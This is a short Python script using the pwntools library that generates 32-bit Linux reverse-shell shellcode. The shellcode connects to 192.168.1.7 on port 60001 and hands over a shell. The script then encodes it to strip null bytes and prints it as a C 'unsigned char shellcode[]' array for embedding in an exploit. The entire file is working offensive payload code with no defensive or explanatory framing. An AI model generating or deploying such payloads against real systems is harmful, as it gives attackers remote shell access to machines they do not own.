import socket
import struct
import datetime
import time

from pwn import *  # type: ignore # pyright: ignore

context.update(arch='i386', os='linux')

host = '192.168.1.7'
port = 60001

# pyright: ignore говорит анализатору не проверять динамический shellcraft
raw_asm = shellcraft.connect(host, port) + shellcraft.dupsh()  # pyright: ignore
raw_bytes = asm(raw_asm)

clean_payload = encoder.encode(raw_bytes, avoid=b'\x00')  # pyright: ignore

c_array = "".join(f"\\x{b:02x}" for b in clean_payload)

print(f"/* Length: {len(clean_payload)} bytes */")
print(f'unsigned char shellcode[] = "{c_array}";')
